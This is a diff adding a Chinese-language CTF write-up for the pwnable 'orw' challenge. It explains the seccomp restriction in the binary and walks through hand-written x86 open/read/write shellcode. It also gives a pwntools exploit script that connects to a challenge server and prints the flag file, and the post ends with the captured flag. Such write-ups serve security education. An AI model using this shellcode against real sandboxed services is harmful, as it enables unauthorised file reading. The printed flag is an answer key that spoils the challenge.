@@ -1,0 +1,103 @@
+---
+layout: post
+title:  orw
+date:   2021-06-22 00:01:01 +0300
+image:  2021-06-22-cafe.jpg
+tags:   [ctf,Pwn,shellcode,seccomp,pwnable]
+---
+
+main
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  orw_seccomp();
+  printf("Give my your shellcode:");
+  read(0, &shellcode, 0xC8u);
+  ((void (*)(void))shellcode)();
+  return 0;
+}
+```
+
+调用`orw_seccomp`函数后，输入`shellcode`后执行`shellcode`
+
+orw_seccomp
+
+```assembly
+unsigned int orw_seccomp()
+{
+  __int16 v1; // [esp+4h] [ebp-84h]
+  char *v2; // [esp+8h] [ebp-80h]
+  char v3; // [esp+Ch] [ebp-7Ch]
+  unsigned int v4; // [esp+6Ch] [ebp-1Ch]
+
+  v4 = __readgsdword(0x14u);
+  qmemcpy(&v3, &unk_8048640, 0x60u);
+  v1 = 12;
+  v2 = &v3;
+  prctl(38, 1, 0, 0, 0);
+  prctl(22, 2, &v1);
+  return __readgsdword(0x14u) ^ v4;
+}
+```
+
+seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。
+
+`orw_seccomp函数`执行了两次`prctl`函数
+
+第一次调用prctl函数 ——禁止提权
+
+第二次调用prctl函数 ——限制能执行的系统调用只有open，write，exit
+
+所以我们不能使用特殊的系统调用`getshell`，但是可以用`open`、`read`、`write`三个系统调用去读flag。
+
+打开flag文件，`sys_open(file,0,0)`；系统调用号为5
+
+```assembly
+push 0x0  			#字符串结尾
+push 0x67616c66		#'flags'
+mov ebx,esp			
+xor ecx,ecx			#0
+xor edx,edx			#0
+mov eax,0x5			#调用号
+int 0x80			#sys_open(flags,0,0)
+```
+
+读flag文件，`sys_read(3,file,0x100)`；系统调用号为3
+
+```assembly
+mov eax,0x3; 
+mov ecx,ebx;	# ecx = char __user *buf 缓冲区，读出的数据-->也就是读“flag”
+mov ebx,0x3;	# 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件
+mov edx,0x100;	#对应字节数
+int 0x80;
+```
+
+输出flag文件内容，`sys_write(1,file,0x30)`；系统调用号为4
+
+```assembly
+mov eax,0x4;	# eax = sys_write
+mov ebx,0x1;	# ebx = unsigned int fd = 1
+int 0x80;
+```
+
+exp
+
+```assembly
+from pwn import *
+
+io = remote("node4.buuoj.cn", 29378)
+
+shellcode = shellcraft.open("./flag")
+shellcode += shellcraft.read("eax", "esp", 100)
+shellcode += shellcraft.write(1, "esp", 100)
+
+payload = asm(shellcode)
+
+io.recvuntil("Give my your shellcode:")
+io.sendline(payload)
+
+io.interactive()
+```
+
+flag{c21dbce2-52a0-4d7c-95a1-eb8bdffc2732}
